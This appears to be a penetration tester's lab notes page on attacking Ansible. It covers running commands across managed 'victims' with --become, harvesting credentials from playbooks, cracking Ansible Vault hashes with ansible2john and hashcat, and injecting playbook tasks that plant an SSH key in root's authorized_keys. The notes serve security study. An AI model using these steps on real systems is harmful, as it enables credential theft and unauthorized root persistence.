---
layout:     post
author:     0x5c4r3
type: docs
permalink: Ansible
---


<span style="font-size: 35px; color:red"><b>Ansible</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Commands</b></span>

Ansible is an infrastructure configuration engine that enables IT personnel to dynamically and automatically configure IT infrastructure and computing resources through Python scripts.
Config in <span style="color:red">/etc/ansible/hosts</span>.
The <span style="color:red">ansibleadm</span> user on the controller issues commands.
From the command machine:
```shell
ansible victims -a "whoami"
```
This will run _whoami_ on all members of the Ansible group. To run it as root <span style="color:red">ansible victims -a "whoami" --become</span> or specify the user <span style="color:red">ansible victims -a "whoami" --become user2</span>.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Playbooks</b></span>
Sets of tasks written in YAML to be scripted so that they can be run in a routine.
Check this files in <span style="color:red">/opt/playbooks</span> to see if there's any info leakage.
I.E.
```yaml
- name: Write a file as offsec
  hosts: all
  gather_facts: true
  become: yes
  become_user: offsec <-------
  vars:
    ansible_become_pass: lab <---------
  tasks:
    - copy:
          content: "This is my offsec content"
          dest: "/home/offsec/written_by_ansible.txt"
          mode: 0644
          owner: offsec
          group: offsec
```
Ansible has a new features called _Ansible Vault_ to securely store credentials for playbooks:
```yaml
ansible_become_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          39363631613935326235383232616639613231303638653761666165336131313965663033313232
          3736626166356263323964366533656633313230323964300a323838373031393362316534343863
          36623435623638373636626237333163336263623737383532663763613534313134643730643532
          3132313130313534300a383762366333303666363165383962356335383662643765313832663238
          3036
```
Copy the hash starting with "$ANSIBLE_VAULT......." and use <span style="color:red">ansible2john</span> to convert it in a crackable way to then:
```shell
hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
```
to then decrypt the vault like:
```shell
cat pw.txt | ansible-vault decrypt
```
Also, if the playbook files used on the controller have world-writable permissions or if we can find a way to write to them (perhaps through an exploit), we can inject tasks that will then be run the next time the playbook is run.
I.E. to add to the yaml playbook:
```yaml
- name: Create a directory if it does not exist
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root

    - name: Create authorized keys if it does not exist
      file:
        path: /root/.ssh/authorized_keys
        state: touch
        mode: '0600'
        owner: root
        group: root

    - name: Update keys
      lineinfile:
        path: /root/.ssh/authorized_keys
        line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
        insertbefore: EOF
```
Also, some modules from Ansible might leak data in <span style="color:red">/var/log/syslog</span> (I.E. shell module)
